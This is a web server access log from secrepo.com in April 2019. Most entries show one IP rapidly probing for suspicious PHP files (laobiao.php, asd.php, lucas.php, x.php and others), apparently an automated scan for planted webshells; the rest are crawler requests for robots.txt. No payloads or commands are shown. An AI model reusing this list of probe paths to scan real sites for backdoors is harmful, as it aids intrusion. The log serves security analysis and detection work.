122.114.146.180 - - [16/Apr/2019:09:21:56 -0700] "POST //plus/laobiao.php HTTP/1.1" 301 529 "http://secrepo.com//plus/laobiao.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:21:57 -0700] "GET /plus/laobiao.php HTTP/1.1" 404 294 "http://secrepo.com//plus/laobiao.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:21:58 -0700] "POST //data/cache/asd.php HTTP/1.1" 301 533 "http://secrepo.com//data/cache/asd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:21:59 -0700] "POST //plus/lucas.php HTTP/1.1" 301 525 "http://secrepo.com//plus/lucas.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:00 -0700] "GET /plus/lucas.php HTTP/1.1" 404 295 "http://secrepo.com//plus/lucas.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:00 -0700] "POST //plus/read.php HTTP/1.1" 301 523 "http://secrepo.com//plus/read.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:01 -0700] "GET /plus/read.php HTTP/1.1" 404 294 "http://secrepo.com//plus/read.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:01 -0700] "POST //indexa.php HTTP/1.1" 301 517 "http://secrepo.com//indexa.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:01 -0700] "GET /indexa.php HTTP/1.1" 404 294 "http://secrepo.com//indexa.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:02 -0700] "POST //coon.php HTTP/1.1" 301 513 "http://secrepo.com//coon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:02 -0700] "GET /coon.php HTTP/1.1" 404 294 "http://secrepo.com//coon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:02 -0700] "POST //plus/read.php HTTP/1.1" 301 523 "http://secrepo.com//plus/read.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:03 -0700] "GET /plus/read.php HTTP/1.1" 404 294 "http://secrepo.com//plus/read.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:03 -0700] "POST //data/cache/flye.php HTTP/1.1" 301 535 "http://secrepo.com//data/cache/flye.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:04 -0700] "GET /data/cache/flye.php HTTP/1.1" 404 294 "http://secrepo.com//data/cache/flye.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:04 -0700] "POST //plus/mybak.php HTTP/1.1" 301 525 "http://secrepo.com//plus/mybak.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:04 -0700] "GET /plus/mybak.php HTTP/1.1" 404 294 "http://secrepo.com//plus/mybak.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:05 -0700] "POST //plus/x.php HTTP/1.1" 301 517 "http://secrepo.com//plus/x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:05 -0700] "GET /plus/x.php HTTP/1.1" 404 294 "http://secrepo.com//plus/x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:05 -0700] "POST //lx.php HTTP/1.1" 301 509 "http://secrepo.com//lx.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:06 -0700] "GET /lx.php HTTP/1.1" 404 294 "http://secrepo.com//lx.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
68.108.67.48 - - [16/Apr/2019:09:22:07 -0700] "GET /Datasets%20Description/Network/ssh.html HTTP/1.1" 200 1262 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
122.114.146.180 - - [16/Apr/2019:09:22:09 -0700] "POST //x.php HTTP/1.1" 301 508 "http://secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:22:10 -0700] "GET /x.php HTTP/1.1" 404 295 "http://secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
123.125.67.221 - - [16/Apr/2019:09:24:11 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
220.181.108.159 - - [16/Apr/2019:09:24:14 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.67.221 - - [16/Apr/2019:09:24:14 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
220.181.108.157 - - [16/Apr/2019:09:24:16 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
